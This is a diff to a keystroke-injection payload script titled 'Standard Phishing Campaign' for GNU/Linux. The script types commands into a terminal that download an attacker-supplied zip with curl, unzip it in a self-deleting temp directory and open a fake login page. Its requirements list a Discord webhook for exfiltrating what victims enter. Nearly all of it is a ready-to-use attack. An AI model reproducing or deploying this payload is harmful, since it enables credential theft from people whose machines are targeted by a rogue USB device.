@@ -1,54 +1,55 @@
-* #############################################
-* #                                           |
-* # Title        : Standard Phishing Campaign |
-* # Author       : Aleff                      |
-* # Version      : 1.0                        |
-* # Category     : Phishing                   |
-* # Target       : Linux                      |
-* #                                           |
-* #############################################
+#############################################
+#                                           #
+# Title        : Standard Phishing Campaign #
+# Author       : Aleff                      #
+# Version      : 1.0                        #
+# Category     : Phishing                   #
+# Target       : GNU/Linux                  #
+#                                           #
+#############################################
 
-* Requirements:
-*     - Internet Connection
-*     - You own ZIP link
-*     - Discord webhook (or whatever you want to use for the exfiltration)
-*     - Python
-*     - 'ExecutionPolicy Bypass' if used in Windows 10/11
+ATTACKMODE HID
 
+# Requirements:
+#  - Internet Connection
+#  - You own ZIP link
+#  - Discord webhook (or whatever you want to use for the exfiltration)
+#  - Python
+#  - 'ExecutionPolicy Bypass' if used in Windows 10/11
 
-QUACK DELAY 1000
+# VARIABLES:
+# - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
+ZIP_LINK='example.com/file.zip'
+
+QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 2000
 
-
-* #### Main SECTION ####
-
-* Create a random directory
+# Create a random directory
 QUACK STRING dir_name=$(mktemp -d)
 QUACK ENTER
 QUACK DELAY 500
 
-* Delete the directory after 60 minutes (3600 seconds)
+# Delete the directory after 60 minutes (3600 seconds)
 QUACK STRING (sleep 3600 && rm -rf $dir_name) &
 QUACK ENTER
 QUACK DELAY 500
 
-* Move into the directory
+# Move into the directory
 QUACK STRING cd $dir_name
 QUACK ENTER
 QUACK DELAY 500
 
-* Download the zip from your own link
-* REQUIRED - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
-QUACK STRING curl -LOk "#ZIP_LINK"
+# Download the zip from your own link
+QUACK STRING curl -LOk "$ZIP_LINK"
 QUACK ENTER
 QUACK DELAY 500
 
-* Unzip it
+# Unzip it
 QUACK STRING unzip file.zip
 QUACK ENTER
 QUACK DELAY 500
 
-* Open the login page
+# Open the login page
 QUACK STRING xdg-open login.html; exit;
 QUACK ENTER
